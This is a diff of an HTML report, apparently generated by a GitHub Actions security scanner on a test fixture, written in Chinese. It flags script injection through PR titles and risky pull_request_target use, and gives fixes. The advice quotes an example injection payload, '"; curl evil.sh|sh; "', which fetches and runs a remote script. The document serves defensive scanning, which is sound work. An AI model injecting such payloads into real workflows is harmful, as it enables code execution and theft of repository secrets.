@@ -68,18 +68,18 @@
         <td><span class="dot" style="--c:#ea580c"></span>高</td>
         <td><div class="t">run 里直接插值外部可控输入（脚本注入）</div><div class="src">GitHub Security Lab《Script injections in GitHub Actions》—— 攻击者可通过 PR 标题/分支名注入 shell 命令</div></td>
         <td><code>.github/workflows/bad.yml:15</code><div class="ev">run: | echo &quot;PR title: ${{ github.event.pull_request</div></td>
-        <td class="adv">${{ github.event.pull_request.title }} 这类值由**外部贡献者可控**。直接插进 run 里，等于让陌生人往你的 shell 里写字（比如标题里放 `&quot;; curl evil.sh|sh; &quot;`）。改成先写进 env: 再引用 $VAR。</td>
+        <td class="adv">${{ github.event.pull_request.title }} 这类值由<b>外部贡献者可控</b>。直接插进 run 里，等于让陌生人往你的 shell 里写字（比如标题里放 <code>&quot;; curl evil.sh|sh; &quot;</code>）。改成先写进 env: 再引用 $VAR。</td>
       </tr>
       <tr class="sev-medium">
         <td><span class="dot" style="--c:#ca8a04"></span>中</td>
         <td><div class="t">使用 pull_request_target 触发</div><div class="src">GitHub Docs — Events that trigger workflows: pull_request_target；GitHub Security Lab《Preventing pwn requests》</div></td>
         <td><code>.github/workflows/bad.yml:3</code><div class="ev">pull_request_target</div></td>
-        <td class="adv">pull_request_target 在**目标仓库上下文**运行，能拿到 secrets，且默认有写权限。若后续 checkout 了 PR 的代码（ref: github.event.pull_request.head.sha）并执行其中的脚本，外部贡献者可直接窃取 secrets。若只是打标签/评论、不 checkout PR 代码，则风险可控 —— 请人工确认。</td>
+        <td class="adv">pull_request_target 在<b>目标仓库上下文</b>运行，能拿到 secrets，且默认有写权限。若后续 checkout 了 PR 的代码（ref: github.event.pull_request.head.sha）并执行其中的脚本，外部贡献者可直接窃取 secrets。若只是打标签/评论、不 checkout PR 代码，则风险可控 —— 请人工确认。</td>
       </tr></tbody></table>
 
   <footer>
     <p>扫描范围：<code>tests/fixtures/fail/demo-project</code> · 1 个文件</p>
-    <p>规则库：— · 生成时间：2026-10-13 02:04:44</p>
+    <p>规则库：— · 生成时间：2026-10-13 02:06:19</p>
     <p></p>
   </footer>
 </div></body></html>
